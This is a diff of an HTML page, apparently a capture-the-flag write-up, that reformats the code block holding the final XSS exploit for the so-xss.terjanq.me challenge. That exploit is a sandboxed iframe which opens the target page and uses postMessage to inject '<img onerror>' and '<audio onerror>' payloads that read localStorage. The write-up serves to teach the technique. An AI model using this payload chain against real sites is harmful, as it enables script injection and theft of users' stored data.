@@ -310,19 +310,27 @@ onmessage = e => {
 
 <p>so the final payload will look like this:</p>
 
-<pre><code>&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt;     &lt;meta charset="UTF-8"&gt;     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;     &lt;title&gt;My first writeup&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;script&gt;  let iframe = document.createElement('iframe');     iframe.sandbox = 'allow-scripts allow-popups allow-top-navigation'; let payload = "x=opener.top;
-
-opener.postMessage(1,'*');
-
-setTimeout(() =&gt; {
+<pre><code>&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt;     &lt;meta charset="UTF-8"&gt;     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;     &lt;title&gt;My first writeup&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;script&gt;  let iframe = document.createElement('iframe');     iframe.sandbox = 'allow-scripts allow-popups allow-top-navigation'; 
+  let payload = "x=opener.top; opener.postMessage(1,'*'); setTimeout(() =&gt; {
   x.postMessage({
     type: 'render',
     identifier,
     body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'
   }, '*');
-}, 1000)";   iframe.srcdoc=` &lt;h1&gt;hello&lt;/h1&gt; &lt;script&gt; onclick = e =&gt; {         let w = open('https://so-xss.terjanq.me/iframe.php');        onmessage = e =&gt;
-  top.location = 'https://so-xss.terjanq.me/iframe.php';         setTimeout(_ =&gt; {           w.postMessage({type: "render", body: "&lt;audio/src/onerror=\\&quot;${payload}\\&quot;&gt;"}, '*')         }, 1000);       };     &lt;\/script&gt; `  document.body.appendChild(iframe); &lt;/script&gt;   &lt;/body&gt; &lt;/html&gt;</code></pre>
+}, 1000)";   iframe.srcdoc=`
+&lt;h1&gt;hello&lt;/h1&gt;
+&lt;script&gt;
+onclick = e =&gt; {
+        let w = open('https://so-xss.terjanq.me/iframe.php');
+        onmessage = e =&gt; top.location = 'https://so-xss.terjanq.me/iframe.php';
+        setTimeout(_ =&gt; {
+          w.postMessage({type: &quot;render&quot;, body: &quot;&lt;audio/src/onerror=\\&quot;${payload}\\&quot;&gt;&quot;}, '*')
+        }, 1000);
+      };
 
+
+  &lt;\/script&gt;
+`
 <p>first of all, the sandboxed iframe, sends a payload using audio tag. the payload sent is:</p>
 
 <pre><code>x=opener.top;
